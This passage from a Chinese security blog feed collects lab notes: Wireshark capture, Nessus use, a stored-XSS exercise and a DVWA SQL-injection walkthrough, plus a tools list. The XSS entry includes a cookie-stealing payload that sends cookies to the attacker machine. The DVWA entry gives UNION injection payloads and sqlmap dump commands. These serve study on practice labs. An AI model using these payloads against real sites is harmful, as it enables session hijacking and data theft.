拿出来的b5acfe0daa101b0b4c5f2f8bdf834038和57ec220296a9d7e1316c086a90185a0b 到https://www.md5online.org/去解密一下 12Found : 1524904334(hash = b5acfe0daa101b0b4c5f2f8bdf834038) 12Found : 1524904333(hash = 57ec220296a9d7e1316c086a90185a0b) 发现本地的时间慢了一秒，就在time.time()后+1 根据自己的时间调整一下 flag假的flag，自己跑跑代码吧 1b&quot;\r\n\r\n&lt;script&gt;alert(&apos;flagxxxxxxxx&apos;)&lt;/script&gt;&quot; 参考链接： https://www.jianshu.com/p/e4b8fd7dda08]]></content>
      <categories>
        <category>Misc</category>
        <category>实验吧</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全实验链接]]></title>
    <url>%2F2018%2F04%2F27%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[实验一 流量捕获实验 实验二 TCP/IP协议攻击 实验三 CA证书与SSL连接(DJ的资料已经很详细了，我就不放出了) 实验四 配置主机防火墙防止Dos攻击 ​ 后面Dos攻击还需要实验一下 实验六 综合扫描 实验五 WiFi钓鱼 实验七 XSS跨站脚本攻击 实验八 SQL注入攻击]]></content>
  </entry>
  <entry>
    <title><![CDATA[Wireshark捕获手机流量]]></title>
    <url>%2F2018%2F04%2F27%2F%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F%2F</url>
    <content type="text"><![CDATA[环境windows10 实验过程设置——&gt;网络和Internet——&gt;移动热点——&gt;开启 手机连上移动热点，被分配到的IP地址是192.168.137.248 手机在一个网址登陆 然后在站长之家查询一下域名的ip地址 得到 1IP:121.42.137.89 Wireshark过滤一下 1ip.src == 192.168.137.248 and ip.addr == 121.42.137.89 and http 过滤得到 查看Post请求，在HTML表单可以查看到提交的用户名和密码]]></content>
  </entry>
  <entry>
    <title><![CDATA[Nessus初步使用]]></title>
    <url>%2F2018%2F04%2F27%2FNessus%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[如何安装可以参考最后的参考链接 安装之后浏览器会自动跳出页面 输入用户名和密码后 继续输入激活码 更新插件出错 123PS C:\Program Files\Tenable\Nessus&gt; .\nessuscli update[Thu Apr 26 23:50:26 2018][12888.1] Could not open C:\ProgramData\Tenable\Nessus\nessus\master.key - 拒绝访问。Error: Only root can use update 使用管理员权限打开DOS 1.\nessuscli update 更新好之后进入 1https://localhost:8834/#/ 输入之前设置好了账号密码，进入 选择Advanced Scan 简单配置下，扫描本地，save 在My Scans就会出现刚刚创建的Scan，点击lauch 然后耐心等待一下 点一个进去有描述和解决方案 参考链接官方7.0文档：https://docs.tenable.com/nessus/7_0/Content/Resources/PDF/Nessus_7_0.pdf 官方6.11文档：https://docs.tenable.com/nessus/6_11/Content/Resources/PDF/Nessus_6_11.pdf Nessus离线安装及升级插件 Nessus的安装/激活/更新]]></content>
      <categories>
        <category>CTF工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[合天的跨站脚本攻击基础实验]]></title>
    <url>%2F2018%2F04%2F27%2F%E5%90%88%E5%A4%A9%E7%9A%84%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[实验环境两台互相连网Windows主机。拓扑图如下： 说明： 网络环境中有两台主机，有一台主机在实验环境可见并可登录，我们称为实验机（客户机）；另一台主机不可见，但从实验机可以访问，这台主机即为本次实验任务的攻击目标，我们称为目标机。 实验机IP为：10.1.1.78；目标机IP为：10.1.1.2。 在目标主机上安装了跨站脚本攻击的演练平台（留言系统），供本次实验使用。 实验步骤一预备任务：启动并访问留言系统​ 在预备任务中，我们将安装在目标主机上的跨站脚本攻击演练平台（留言系统）。 ​ 1、使用远程桌面登录至练习主机。 ​ 2、使用浏览器打开http://10.1.1.2页面，进入跨站脚本攻击演练平台，如下图所示： ​ 3、给留言系统添加留言，熟悉本系统环境。 ​ 4、管理留言。 ​ 点击“管理留言”，用户名：admin，密码：admin123，可以对刚留言进行管理。 存储式跨站脚本漏洞检测​ 1、登录到实验机上，用IE浏览器中打开留言系统（10.1.1.2）。 ​ 2、在留言内容中填写包含有跨站测试的脚本，提交后观察返回效果。 1&lt;script&gt;alert(&quot;XSS TEST&quot;)&lt;/script&gt; ​ 如下图所示： ​ 3、刷新留言系统，如果新加留言显示如下，则说明系统有存储式跨站漏洞。 ​ 4、思考： ​ 测试当其他用户打开这个页面时，嵌入的代码是否会执行？分析留言系统代码，为什么填写的留言脚本会被执行？ 跨站脚本攻击的危害不包括下列哪项： 【A】盗取其它用户的cookie; 【B】盗取web系统的登录帐号； 【C】即使不访问危害页面也能读取用户的cookie; 【D】获取访问用户的帐户信息； 答案选C，因为XSS攻击需要用户访问危害页面才起作用 实验步骤二利用存储式跨站漏洞窃取用户cookie 使用跨站漏洞加载恶意网页 ​ 清空实验一任务，将恶意网页（假设http://www.heetian.com）放入留言系统数据库，并在用户端执行； ​ 1、增加一留言，并在留言内容中改为 &lt;iframe src=&quot;http://www.hetianlab.com&quot;&gt;&lt;/iframe&gt;，测试返回效果。 2、隐藏恶意网页。增加留言，内容包含以下语句：&lt;iframe src=https://www.baidu.com width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/iframe&gt;，观察返回状态，网页被执行，但未在留言系统界面中显示。这样如果是攻击脚本就可以用此方法隐藏自己。 在本实验中，在提交内容中增加：&lt;iframe src=http://www.baidu.com width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/iframe&gt;，其目的是：【单选题】 【A】在访问实验的显示时，自动会访问www.baidu.com页面，而且用户在页面上查觉不到； 【B】读取访问www.baidu.com页面的cookie； 【C】在实验的显示内容页面中加入www.baidu.com页面，而且访问用户能够看到； 【D】盗取访问www.baidu.com的cookie 选A 实验步骤三利用存储式跨站漏洞窃取用户cookie ​ 1、继续添加留言，包含以下内容：&lt;script&gt;document.write(document.cookie)&lt;/script&gt; ​ 结果如图所示： 2、继续添加留言，包含以下内容： ​ &lt;script&gt;alert(document.cookie)&lt;/script&gt; 3、使用管理员登录，观察显示的cookie有什么不同？ 发现显示的多了管理员的账号和密码 4、思考：这种窃取cookie的方式有什么缺点？有什么方法可以将用户的cookie窃取出并保存下来，而且用户看不到？ ​ 5、在攻击机上使用提供的页面搭建WEB服务器，以便进一步保存浏览用户的cookie。 打开IIS 更换主目录 搭建IIS服务器过程中应注意如下几点： 1）在Web服务扩展中允许Active Server Pages服务 2）默认网站-属性-文档中添加index.asp内容页。 3）在：C:\tools\跨站脚本攻击\中的cookies文件夹属性-安全-组或用户名称（G）-添加-高级-立即查找中找到IUSR_BJHIT-YXI7NEFU8用户，选择并确定 4)给IUSR_BJHIT-YXI7NEFU8用户写入权限 搭建好服务器后，在浏览器中输入本机IP地址进行测试，如下图所示，表示web服务正常进行。 返回http://10.1.1.2页面，继续添加留言，包含以下内容： 1&lt;script&gt;document.write(&quot;&lt;iframe width=0 height=0 src=&apos;http://10.1.1.78/cookie.asp?cookie=&quot;+document.cookie+&quot;&apos;&gt;&lt;/iframe&gt;&quot;);&lt;/script&gt; 提交留言后观察目标服务器页面，没有看到异常现象，如下图所示： 再打开本地页面，查看接收浏览用户的cookie接收情况： 可以看到，已经接收到用户的cookie了，这些cookie包含了所有浏览该页面的信息，如果是登录用户的话，cookie包含了用户的用户名与密码信息。 从本实验来看，下列哪种说法是错误的：【单选题】 【A】10.1.1.2服务器提供web服务，同时具有XSS缺陷； 【B】攻击者通过攻击10.1.1.2服务器，获取该服务器相关敏感信息或数据； 【C】document.write(&quot;&lt;iframe width=0 height=0 src=&#39;http://10.1.1.78/cookie.asp?cookie=&quot;+document.cookie+&quot;&#39;&gt;&lt;/iframe&gt;&quot;);主要作用是获取用户cookie后并传递给用户操作机； 【D】一般情况下，XSS攻击对服务器安全性并没有影响； 选B，因为并没有攻击10.1.1.2服务器 参考网址：实验网址：http://www.hetianlab.com/expc.do?ce=7eb961c2-56d2-49c1-856a-c65edd1c332c 实验指导视频：http://v.youku.com/v_show/id_XODQyMzMzODE2.html?spm=a2h0k.8191407.0.0&amp;from=s1.8-1-1.2]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（4）：DVWA的SQL注入实验]]></title>
    <url>%2F2018%2F04%2F27%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%EF%BC%9ADVWA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[SQL InjectionSQL Injection，即SQL注入，SQLi，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害巨大，常常会导致整个数据库被“脱裤”，如今SQL注入仍是现在最常见的Web漏洞之一。 SQL注入分类按SQLMap中的分类来看，SQL注入类型有以下5种： 1234UNION query SQL injection（可联合查询注入）Stacked queries SQL injection（可多语句查询注入） Boolean-based blind SQL injection（布尔型注入） Error-based SQL injection（报错型注入） Time-based blind SQL injection（基于时间延迟注入） SQL注入常规利用思路：123451、寻找注入点，可以通过web扫描工具实现2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息） 4、可以通过获得的用户信息，寻找后台登录。5、利用后台或了解的进一步信息，上传webshell或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。 手工注入常规思路：12345671.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.查询到账户的数据 下面对四种级别的代码进行分析。 LOW等级123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; mysqli_close($GLOBALS["___mysqli_ston"]);&#125;?&gt; 分析：由代码可知，通过REQUEST方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。 利用常用注入测试的POC 判断注入输入1 输入&#39;，单引号 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;&apos;&apos;&apos; at line 1 注入id=1’ and ‘1’=’2` 返回为空 注入id=1&#39; or &#39;1&#39;=&#39;1，返回全部用户 查询表的列数id=1&#39; order by 1 # 页面正常 id=1&#39; order by 2 # 页面正常 id=1&#39; order by 3 # 页面还是正常，MySQL的注释也有#，但为啥不起作用 id=1&#39; order by 3 --，报错，说明表的有两列 确立回显名11&apos; union select 1,2# 猜数据库：11&apos; union select 1,database()-- 用户和数据库版本11&apos; union select user(),version()-- 注意：union查询结合了两个select查询结果，根据上面的order by语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用union查询结合我们构造的另外一个select.注意在使用union查询的时候需要和主查询的列数相同。 猜表名11&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()-- 得到表名：guestbook,users 猜列名1231&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273-- 1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =&apos;users&apos;-- (用编码就不用单引号，用单引号就不用编码，0x7573657273是users的十六进制) 得到列： 1id,name,password,email,birthday,user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,pid 猜用户数据列举几种payload: 1231&apos; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users -- 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- 1&apos; union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users -- 得到用户数据 1234567891011121314151617181920212223ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: adminSurname: adminID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: admin : 5f4dcc3b5aa765d61d8327deb882cf99ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: gordonb : e99a18c428cb38d5f260853678922e03ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: 1337 : 8d3533d75ae2c3966d7e0d4fcc69216bID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: pablo : 0d107d09f5bbe40cade3de5c71e9e9b7ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: smithy : 5f4dcc3b5aa765d61d8327deb882cf99 猜root用户11&apos; union select 1,group_concat(user,password_expired) from mysql.user-- 拿到root用户密码为空：rootN,mysql.sysN,PC-201702142156N 自个去数据库查询一下，结果一样 123456789mysql&gt; select Host,User,password_expired from mysql.user;+-----------+-----------------+------------------+| Host | User | password_expired |+-----------+-----------------+------------------+| localhost | root | N || localhost | mysql.sys | N || % | PC-201702142156 | N |+-----------+-----------------+------------------+3 rows in set (0.00 sec) Medium等级12345678910111213141516171819202122232425262728293031 &lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id); $query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '&lt;pre&gt;' . mysqli_error($GLOBALS["___mysqli_ston"]) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = "SELECT COUNT(*) FROM users;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS["___mysqli_ston"]);?&gt; 分析使用了mysqli_real_escape_string函数对特殊字符进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 利用1id=1&apos; 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\&apos;&apos; at line 1 改一改，还是报错 1id=1&apos; or &apos;1&apos;=&apos;1 -- 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\&apos; or \&apos;1\&apos;=\&apos;1 --&apos; at line 1 1id=1 or 1 = 1 查询成功，说明存在数字型注入。 （由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。） 猜表名：11 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 得到表名：guestbook,users 猜列名：考虑到单引号被转义，可以利用16进制进行绕过，抓包更改参数id为 11 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 # 得到列： 1id,name,password,email,birthday,user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,pid 猜用户数据抓包修改参数id为 11 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 得到用户数据：admin 5f4dcc3b5aa765d61d8327deb882cf99 High等级123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125;?&gt; 可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 漏洞利用虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 11 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # Impossible等级123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。 SQLmap在XSS的reflected输入1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 拿到cookie，要自己手打，复制PDF的有问题 1security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6 然后跑sqlmap12sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; 1234567891011121314151617181920212223sqlmap identified the following injection point(s) with a total of 211 HTTP(s) requests:---Parameter: id (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT) Payload: id=1&apos; OR NOT 9083=9083#&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1&apos; AND (SELECT 3545 FROM(SELECT COUNT(*),CONCAT(0x716a716a71,(SELECT (ELT(3545=3545,1))),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- XEQK&amp;Submit=Submit Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1&apos; AND SLEEP(5)-- tAHb&amp;Submit=Submit Type: UNION query Title: MySQL UNION query (NULL) - 2 columns Payload: id=1&apos; UNION ALL SELECT NULL,CONCAT(0x716a716a71,0x4f467165756c664d454e536f626c4a5452466d7048626c717976795a454b7a565578707376506767,0x716b707071)#&amp;Submit=Submit---[20:28:38] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: Apache 2.4.9, PHP 5.5.12back-end DBMS: MySQL &gt;= 5.0 爆数据库1python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; --current-db --tables 没想到它顺便连表也爆了 123456Database: dvwa[2 tables]+------------------------------------------------------+| guestbook || users |+------------------------------------------------------+ 爆列名12python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; -T users --columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ 爆用户名12python .\sqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=avrgdkgucbolkes16f4jr852d6&quot; -T users --dump 123456789101112Database: dvwaTable: users[5 entries]+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://localhost/dvwa/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2018-04-25 21:55:38 | 0 || 2 | http://localhost/dvwa/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2018-04-25 21:55:38 | 0 || 3 | http://localhost/dvwa/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2018-04-25 21:55:38 | 0 || 4 | http://localhost/dvwa/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2018-04-25 21:55:38 | 0 || 5 | http://localhost/dvwa/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2018-04-25 21:55:38 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ 参考链接：新手指南：DVWA-1.9全级别教程之SQL InjectionDVWA SQL Injection 通关教程MySQL 字符串连接CONCAT()函数浅析MySQL中concat以及group_concat的使用PHP mysql_real_escape_string() 函数]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows好用的小工具]]></title>
    <url>%2F2018%2F04%2F27%2FWindows%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[介绍内容来自微信公众号：少数派 0x00 WGestures除了键盘操作外，鼠标手势也是提高效率的重要手段。借助 WGestures，你可以在任何窗口通过鼠标右键或滚轮等绘制手势来执行各种命令，实现多任务处理、媒体控制、网页导航、命令行操作等功能。你也可以根据需要按应用设置手势或添加黑名单，防止误操作。 WGestures 由国人应元东开发。他的其它一些作品包括模拟机械键盘声音的 Tickeys、轻量级词典 QingDict 和应用切换器增强 CmdTap 等。 0x01 Snipaste作为 Windows 平台上最有特色的截图软件之一，Snipaste 自诞生之日起就受到了众多关注。除了自动检测边界及文本、形状、箭头、涂鸦、高亮、马赛克等强大标注功能外，Snipaste 还能让你将截图或剪贴板内容直接固定在屏幕上，方便随时查看。 Snipaste 由博士研究生 levie 历经三年开发，目前所有功能免费且无广告，同时提供商店版及绿色免安装版，macOS 及 Linux 版也正在路上。 0x02 Wox如果你在寻找一款类似 Alfred 的快捷启动器，Wox 可以说是你的不二之选。它可以调用 Everything 进行快速全局搜索，也可以通过关键词唤起网络搜索引擎。你还可以安装各种插件，实现翻译、天气、命令行等进阶功能。 详细介绍的教程 0x03 Yu Writer一款能找到写作乐趣的 Markdown 文本编辑器 相比 macOS 的百花齐放，在 Windows 上用 Markdown 进行写作一直没有太多选择，直到 Yu Writer 横空出世。你可以利用它自由写作，并在统一的文档库中进行管理，Yu Writer 会自动保存你的写作进度及操作记录，随时回滚至以前版本。写作完成之后，你可以将文章导出为 PDF、Docx、HTML 和微信公众号等多种格式，并选择主题配色。Yu Writer 的界面同样支持更换主题，功能区也可以自由定制。 少数派之前也详细介绍过 Yu Writer，关注少数派（ID：sspaime）在后台回复「Yu Writer 」了解更多。 除了 Yu Writer 外，Windows 平台上还有为知笔记和 Leanote 等支持 Markdown 的国产笔记应用，欢迎大家下载体验。如果你只是需要一款更强大的文本编辑器，可以试试 EverEdit 或 Notepad++（台湾同胞开发）等软件，相信不会让你失望。 0x04 任务栏透明化：TranslucentTB这是一个可以让 Windows 底部的菜单栏变得模糊、完全透明的小插件。 0x05 电子书管理神器：CalibreKindle 用户耳熟能详的电子书管理神器 Calibre，也是一款高质量的开源软件。它可以管理几乎所有的电子书格式，与电子书有关的所有操作都可以在 Calibre 一个软件中完成。图书管理、格式转换、新闻获取、电子书编辑……几乎无所不能。 之前在外观上稍显落后，新版本已经改进很多，我想不到有什么理由拒绝使用它。如果你是电子书爱好者，一定不能错过这款神器。]]></content>
      <categories>
        <category>趣味玩耍</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（3）：MySQL-information_schema介绍]]></title>
    <url>%2F2018%2F04%2F26%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9AMySQL-information-schema%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[一、information_schema是什么information_schema是MySQL自带的一个信息数据库，其保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名，数据库的表，表栏的数据类型与访问权限等。 也就是说当你建立一个新的数据库，或者在已有的数据库中增删改表的话，都会记录在information_schema库中。 它提供了访问数据库元数据的方式。什么是元数据呢。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。 在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 例如下面就可以把全部数据库select出来 12345678910111213mysql&gt; select schema_name from information_schema.schemata;+--------------------+| schema_name |+--------------------+| information_schema || learning || mysql || performance_schema || sakila || sys || t2 || test |+--------------------+ 把数据库的表select出来 12345678910111213141516mysql&gt; SELECT * FROM `TABLE_CONSTRAINTS`limit 10;+--------------------+-------------------+-----------------+--------------+---------------+-----------------+| CONSTRAINT_CATALOG | CONSTRAINT_SCHEMA | CONSTRAINT_NAME | TABLE_SCHEMA | TABLE_NAME | CONSTRAINT_TYPE |+--------------------+-------------------+-----------------+--------------+---------------+-----------------+| def | auroralab | PRIMARY | auroralab | user | PRIMARY KEY || def | day06 | PRIMARY | day06 | users | PRIMARY KEY || def | dvwa | PRIMARY | dvwa | guestbook | PRIMARY KEY || def | dvwa | PRIMARY | dvwa | users | PRIMARY KEY || def | mysql | PRIMARY | mysql | columns_priv | PRIMARY KEY || def | mysql | PRIMARY | mysql | db | PRIMARY KEY || def | mysql | PRIMARY | mysql | engine_cost | PRIMARY KEY || def | mysql | PRIMARY | mysql | event | PRIMARY KEY || def | mysql | PRIMARY | mysql | func | PRIMARY KEY || def | mysql | PRIMARY | mysql | gtid_executed | PRIMARY KEY |+--------------------+-------------------+-----------------+--------------+---------------+-----------------+10 rows in set (0.47 sec) 二、information_schema数据库主要表说明SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 COLLATIONS表：提供了关于各字符集的对照信息。 COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。 KEY_COLUMN_USAGE表：描述了具有约束的键列。 